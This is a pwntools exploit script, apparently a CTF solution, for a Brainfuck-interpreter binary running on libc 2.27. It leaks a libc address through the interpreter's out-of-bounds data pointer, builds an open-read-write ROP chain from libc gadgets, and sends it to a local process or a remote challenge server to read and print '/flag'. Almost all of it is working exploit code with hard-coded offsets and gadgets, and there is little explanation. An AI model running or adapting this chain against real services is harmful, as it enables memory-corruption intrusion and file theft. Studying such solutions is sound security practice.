#libc 2.27
from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
binary='./bf.dms'
elf=ELF(binary)
debug=1
if debug:
    io=process(binary)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    gadget=[0x4f2c5 ,0x4f322 ,0x10a38c,0xe569f ,0xe5858,0xe585f,0xe5863,0x10a398]
else:
    io = remote("124.156.135.103",6002)
    libc=ELF('./libc.so')
    gadget=[324293, 324386, 1090444]
s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
ru('enter your code:')
payload='[]'
sl(payload)
ru('want to continue?')

"""
payload="+[>+]"+',.'
payload='y'+payload
sl(payload)
ru('running....\n')
s('\xc0')
ru('done! your code: ')
stack=u64(r(6).ljust(8,b'\x00'))-0x520
print(hex(stack))
ru('want to continue?')
"""
#leak libc
payload="+[>+],."
payload='y'+payload
sl(payload)
ru('running....\n')
s('\xd8')
ru('done! your code: ')
libc.address=u64(r(6).ljust(8,b'\x00'))-0x21b97
print(hex(libc.address))
ru('want to continue?')

"""
0x00000000000439c8 : pop rax ; ret
0x000000000002155f : pop rdi ; ret
0x0000000000023e6a : pop rsi ; ret
0x0000000000001b96 : pop rdx ; ret///
0x00000000001306d9 : pop rdx ; pop rsi ; ret
"""
rax_ret=libc.address+0x00000000000439c8
rdi_ret=libc.address+0x000000000002155f
rsi_ret=libc.address+0x0000000000023e6a
rdx_rsi_ret=libc.address+0x00000000001306d9
libc_bss=libc.address+ 0x3ebb40 #_IO_stdin_2_1和malloc_hook之间 libc可写
libc_bss1=libc_bss-0x10
#orw rop
#read(fd=0,buf=libc_bss1,size=0x20)
payload=b""
payload += p64(rdi_ret) + p64(0x0)
payload += p64(rdx_rsi_ret) + p64(0x20)+p64(libc_bss1) 
payload += p64(libc.symbols['read'])
# open(filename=libc_bss1, flags=0, mode=0)
#flag=2权限不足
payload += p64(rdi_ret) + p64(libc_bss1)
payload += p64(rdx_rsi_ret) + p64(0)+p64(0x0)
payload += p64(libc.symbols['open'])

"""
#syscall写法
payload += p64(rax_ret) + p64(0x101)
payload += p64(rdi_ret) + p64(0xffffff9c)
payload += p64(rdx_rsi_ret) + p64(2)+p64(libc_bss)
payload += p64(libc.address +0x10fd17)
"""

# read(fd=3,buf=libc_bss, size=0x20)
payload += p64(rdi_ret) + p64(0x3)
payload += p64(rdx_rsi_ret) + p64(0x20)+p64(libc_bss) 
payload += p64(libc.symbols['read'])

# write(fd=1,buf= libc_bss, size=0x20)
payload += p64(rdi_ret) + p64(0x1)
payload += p64(rdx_rsi_ret) + p64(0x20)+p64(libc_bss)
payload += p64(libc.symbols['write'])
payload +=b"\x00\x00\x00+[>+],."#将str改回原值，否则报错
payload=b'y'+payload
sl(payload)
ru('running....\n')
s('\xa0\xa0')
ru('want to continue?')
sl('n/flag\x00')

io.interactive()